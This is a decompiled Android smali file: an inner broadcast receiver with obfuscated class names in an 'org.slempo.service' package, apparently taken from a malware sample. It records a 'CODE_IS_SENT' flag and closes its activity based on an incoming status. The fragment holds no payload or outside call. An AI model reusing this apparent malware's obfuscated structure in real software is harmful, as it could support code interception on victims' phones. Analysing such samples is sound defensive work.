.class Lorg/slempo/service/activities/ewkdmcopwekewd$7;
.super Landroid/content/BroadcastReceiver;
.source "ewkdmcopwekewd.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lorg/slempo/service/activities/ewkdmcopwekewd;->initReceiver()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lorg/slempo/service/activities/ewkdmcopwekewd;


# direct methods
.method constructor <init>(Lorg/slempo/service/activities/ewkdmcopwekewd;)V
    .locals 0

    .prologue
    .line 1
    iput-object p1, p0, Lorg/slempo/service/activities/ewkdmcopwekewd$7;->this$0:Lorg/slempo/service/activities/ewkdmcopwekewd;

    .line 564
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 4
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "i"    # Landroid/content/Intent;

    .prologue
    .line 568
    invoke-virtual {p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v1

    const-string v2, "status"

    invoke-virtual {v1, v2}, Landroid/os/Bundle;->getBoolean(Ljava/lang/String;)Z

    move-result v0

    .line 569
    .local v0, "status":Z
    if-eqz v0, :cond_0

    .line 570
    iget-object v1, p0, Lorg/slempo/service/activities/ewkdmcopwekewd$7;->this$0:Lorg/slempo/service/activities/ewkdmcopwekewd;

    invoke-static {v1}, Lorg/slempo/service/activities/ewkdmcopwekewd;->access$22(Lorg/slempo/service/activities/ewkdmcopwekewd;)Landroid/content/SharedPreferences;

    move-result-object v1

    const-string v2, "CODE_IS_SENT"

    .line 571
    const/4 v3, 0x1

    .line 570
    invoke-static {v1, v2, v3}, Lorg/slempo/service/utils/erdkjlmcxwlksd;->putBooleanValue(Landroid/content/SharedPreferences;Ljava/lang/String;Z)V

    .line 572
    iget-object v1, p0, Lorg/slempo/service/activities/ewkdmcopwekewd$7;->this$0:Lorg/slempo/service/activities/ewkdmcopwekewd;

    invoke-virtual {v1}, Lorg/slempo/service/activities/ewkdmcopwekewd;->finish()V

    .line 576
    :goto_0
    return-void

    .line 574
    :cond_0
    iget-object v1, p0, Lorg/slempo/service/activities/ewkdmcopwekewd$7;->this$0:Lorg/slempo/service/activities/ewkdmcopwekewd;

    invoke-static {v1}, Lorg/slempo/service/activities/ewkdmcopwekewd;->access$23(Lorg/slempo/service/activities/ewkdmcopwekewd;)V

    goto :goto_0
.end method
